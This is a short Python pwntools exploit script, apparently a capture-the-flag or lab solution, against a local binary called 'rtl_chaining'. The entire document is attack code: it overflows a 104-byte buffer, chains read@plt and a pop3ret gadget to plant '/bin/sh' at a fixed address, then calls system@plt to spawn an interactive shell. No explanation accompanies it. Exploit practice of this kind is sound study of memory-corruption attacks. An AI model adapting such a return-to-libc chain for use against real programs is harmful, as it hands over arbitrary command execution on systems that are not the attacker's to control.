from pwn import *

read_plt = 0x08048340
pop3ret = 0x08048549
name_addr = 0x0804a028
system_plt = 0x08048370

p = process("./rtl_chaining")

payload = "a"*104
payload += p32(read_plt)
payload += p32(pop3ret)
payload += p32(0)+p32(name_addr)+p32(8)
payload += p32(system_plt)+"a"*4
payload += p32(name_addr)

payload2 = "/bin/sh\00"

p.send(payload)
p.send(payload2)

p.interactive()